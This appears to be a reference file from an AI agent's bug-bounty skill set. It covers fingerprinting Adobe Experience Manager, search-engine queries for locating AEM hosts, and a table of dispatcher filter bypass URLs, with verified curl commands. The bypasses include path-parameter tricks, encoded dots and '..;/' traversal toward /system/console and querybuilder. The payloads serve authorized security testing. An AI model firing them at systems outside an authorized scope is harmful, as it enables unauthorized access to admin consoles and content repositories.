# Fingerprint, Product Line, and the Sling URL Grammar

## Contents

- [Is this AEM](#is-this-aem)
- [External search queries](#external-search-queries)
- [Which product line](#which-product-line--this-split-decides-everything-after-it)
- [Version probes (rung 0 — record, never report)](#version-probes-rung-0--record-never-report)
- [Sling URL decomposition — the conceptual engine](#sling-url-decomposition--the-conceptual-engine)
- [The AEM-specific bypass forms](#the-aem-specific-bypass-forms)
- [Verified curl behaviour for each form](#verified-curl-behaviour-for-each-form)

## Is this AEM

Confirm before spending tokens. Graded by how often the signal is wrong:

| Signal | Where | Confidence |
|---|---|---|
| `Server: Communique-Dispatcher/<ver>` | response headers | Definitive |
| `X-Vhost:` / `Dispatcher:` response headers | response headers | Definitive |
| `/etc.clientlibs/` or `/etc/clientlibs/` referenced in the HTML | page source | Definitive |
| `<meta name="generator" content="Adobe Experience Manager">` | HTML head | Definitive |
| `/content/dam/<brand>/…` asset paths | `<img src>`, `<link href>` | Definitive |
| `cq:`-namespaced classes (`cq-Sidekick`, `cq-Editable`, `cq-dd-`) | HTML/CSS | Strong |
| `Set-Cookie: cq-authoring-mode=` | response headers | Strong — an author instance leaked |
| Swapping `.html` for `.json` returns a `jcr:`-keyed tree | manual probe | Strong |
| "Powered by Adobe Experience Manager" in the footer | page body | Strong |
| `wcm.io`, `granite`, `coralui` strings in the JS bundles | `targets/<program>/js/` | Suggestive |

The JS-bundle signals are exactly what `../../js-source-to-sink` routes here from —
its CMS fingerprint table has the AEM row.

## External search queries

For expanding an already-authorized wildcard scope into AEM hosts. Everything these
return still has to be in scope before you touch it.

```
shodan   http.component:"Adobe Experience Manager"
shodan   http.html:"/etc.clientlibs/"
shodan   http.headers.server:"Communique"
fofa     title="AEM Sign In"
fofa     body="/etc.clientlibs/"
censys   services.http.response.headers.server: Communique-Dispatcher
```

`fofa title="AEM Sign In"` is the highest-value one — it finds author instances
published to the internet, which is a misconfiguration on its own and is where the
`PR:L` catalog in `apsb25-90-catalog.md` becomes reachable.

## Which product line — this split decides everything after it

AEM Sites / Cloud Service and AEM Forms on JEE are different products that share a
brand and are frequently co-hosted on one estate. They have different bulletins,
different affected ranges, and — critically — different authentication requirements.

| Probe | Present → | Go to |
|---|---|---|
| `/etc.clientlibs/`, `/content/`, `/libs/granite/`, `/bin/querybuilder.json` | AEM Sites / Cloud Service | `apsb25-90-catalog.md` — **`PR:L`/`PR:H`, not pre-auth** |
| `/adminui/`, `/FormServer/`, `/soap/services/` | AEM Forms on JEE | `forms-on-jee.md` — **three genuinely unauthenticated bugs** |

A Sites instance has none of the Forms paths. If Forms answers, work it first: the
unauthenticated surface is worth more than the low-privilege one and costs less to
prove.

## Version probes (rung 0 — record, never report)

```bash
H=https://target.example
curl -sI  "$H/" | grep -iE 'server|x-vhost|dispatcher'
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$H/libs/granite/core/content/login.html"
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$H/libs/cq/core/content/welcome.html"
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$H/system/console"
curl -s "$H/" | grep -oE '/etc\.clientlibs/[^"]+' | head -5
```

- `/libs/granite/core/content/login.html` returning 200 is an **author instance**
  reachable from the internet — publish instances normally 404 it. That is the single
  most valuable rung-0 observation on the estate, because the whole APSB25-90 family
  needs an account and this is where accounts log in.
- `/system/console` should be 403 from publish. A 200 is Critical on its own — go
  straight to the OSGi console body oracle in `../SKILL.md`.
- Clientlib paths often embed a build hash or an `lc-<hash>-lc` cache key; HTML
  comments sometimes carry a build date. Both are version hints, both are rung 0.

Write the version into `targets/<program>/notes/`. It is context for a finding, never
a finding. `../../_shared/references/safe-ladder.md` §"Claiming a CVE" is the rule.

## Sling URL decomposition — the conceptual engine

Every request to a Sling backend parses into five parts, and **the dispatcher's regex
matches the raw string while Sling matches the parsed structure**. Every AEM bypass
form is a permutation that makes those two disagree.

```
/[resource-path].[selectors].[extension];[path-params]/[suffix]?[query]
```

| Segment | Example | What Sling does with it |
|---|---|---|
| resource-path | `/content/site/page` | resolves the JCR node at this path |
| selectors | `.recursive.tidy.infinity` | dot-separated hints to the rendering script; stack arbitrarily, and unknown ones are ignored rather than rejected |
| extension | `.json` `.html` `.xml` `.txt` `.csv` | selects the renderer servlet — **the last extension wins** |
| path-params | `;jsessionid=ABC` `;x=a/b.css/c` | Jetty/servlet path parameters. Sling's `decompose_url` drops them; a dispatcher regex usually does not |
| suffix | `/anything/you/like` | handed to the script as `request.requestPathInfo.suffix`; does not change which node resolved |
| query | `?path=/etc&p.limit=10` | ordinary query string |

Two consequences do all the work:

1. **The renderer is chosen by the extension, the node by the resource-path.** So
   `/content/site/page.html/a.json` resolves the same node the dispatcher allowed and
   renders it as JSON, because `.json` is last.
2. **A path parameter is invisible to Sling and visible to the dispatcher.** So
   `/bin/querybuilder.json;x=a/b.css/c` reads to the dispatcher as a `.css` request it
   caches happily, and to Sling as plain `/bin/querybuilder.json`.

Understand these two and you can construct a bypass form for a filter you have never
seen, instead of replaying a list.

## The AEM-specific bypass forms

**This table is the AEM *form* only.** The ordering ladder, the encoding permutation
method, the WAF-vs-origin reasoning and the size-differential oracle are general
techniques owned by `../../broken-access-control/references/edge-filter-bypass.md`
— open that file and run its ladder; use this table for the URLs to run it with.

| Form | Concrete AEM URL | Why the two layers disagree |
|---|---|---|
| Selector/extension smuggling | `/content/site/page.html/a.json` | dispatcher sees an allowed `.html`; Sling renders the last extension, `.json` |
| Depth selectors | `/content/site/page.2.json` `.4.json` | numeric selector = recursion depth; leaks the subtree shape |
| Infinity / tidy | `/content/site/page.infinity.json` `.tidy.infinity.json` | full recursive JSON of the subtree — **read the false-positive gate in `../SKILL.md` before treating this as a finding** |
| Path parameter, bare | `/etc;.json` `/libs;.json` | `;` makes the raw string miss a `^/etc\.json$`-style rule |
| Path parameter, extension differential | `/bin/querybuilder.json;x=a/b.css/c` | dispatcher matches the whitelisted `.css`; Sling drops the whole `;…` segment |
| `..;/` Jetty segment | `/content/..;/system/console` | old Jetty (≤ 9.4.34) treated `..;` as a no-op segment. **Fixed in ≥ 9.4.35** — try once on on-prem 6.x, skip on Cloud Service |
| Unanchored-regex suffix | `/system/console.json/x.html` `/crx/de/index.jsp/.html` | passes a `\.html` rule that was never anchored with `$` |
| Encoded dot | `/etc%2ejson` `/etc%252ejson` | dispatcher compares bytes, the backend decodes |
| Case differential | `/EtC.JsOn` | dispatcher regex is case-sensitive, JCR resolution is not |
| GraphQL `nocanon` traversal | `/graphql/execute.json/..%2f../bin/querybuilder.json` | the `/graphql/execute.json/.*` `LocationMatch` proxies with `nocanon`, so the raw encoded traversal reaches Jetty |
| Hybrid (path-param + GraphQL regex) | `/bin/querybuilder.json;x=x/graphql/execute/json/x` | beats a WAF rule written against the literal `..%2f../` string |

Detect a `nocanon` rule in two requests before investing in the traversal form:

```bash
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$H/graphql/execute.json/probe"
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "$H/adobe/dynamicmedia/deliver/probe"
```

Anything other than the standard dispatcher 403 body means the location is proxied
raw and the traversal form is worth building.

## Verified curl behaviour for each form

Measured on this host against a raw TCP listener that echoes the request line, so
these are what actually went on the wire, not what was typed:

```
$ curl -s "$B/content/we-retail/us/en.html/a.json"
WIRE: GET /content/we-retail/us/en.html/a.json HTTP/1.1

$ curl -s "$B/bin/querybuilder.json;x=a/b.css/c"
WIRE: GET /bin/querybuilder.json;x=a/b.css/c HTTP/1.1

$ curl -s "$B/graphql/execute.json/..%2f../bin/querybuilder.json"
WIRE: GET /graphql/execute.json/..%2f../bin/querybuilder.json HTTP/1.1

$ curl -s "$B/content/..;/system/console"
WIRE: GET /content/..;/system/console HTTP/1.1

$ curl -s "$B/etc%2ejson"
WIRE: GET /etc%2ejson HTTP/1.1

$ curl -s "$B/content/site/page.html/../../../system/console"
WIRE: GET /system/console HTTP/1.1                          <-- curl collapsed it

$ curl -s --path-as-is "$B/content/site/page.html/../../../system/console"
WIRE: GET /content/site/page.html/../../../system/console HTTP/1.1
```

**The rule that falls out of this:** `curl` sends `;`, `..;/`, `%2e`, `%2f` and
mixed case **verbatim** — every encoded form in the table above needs no special
flag. The one form `curl` silently rewrites is a **literal** `/../` sequence, which
it collapses client-side, so a `--path-as-is` test would never leave your machine as
you wrote it. Add `--path-as-is` for literal-dot-dot forms only; adding it elsewhere
changes nothing and is harmless.

A `curl` that quietly normalized your payload and returned a boring 200 is the
easiest false negative in this class. When a form unexpectedly does nothing, echo it
at a local listener before concluding the target is patched.

## Quoting

`;` and `&` need shell quoting. Single-quote the whole URL:

```bash
curl -s 'https://target.example/bin/querybuilder.json;x=a/b.css/c?path=/etc&p.limit=5'
```

Fire everything through the active proxy so it is replayable for the report:
`curl -x 127.0.0.1:8080 …`.
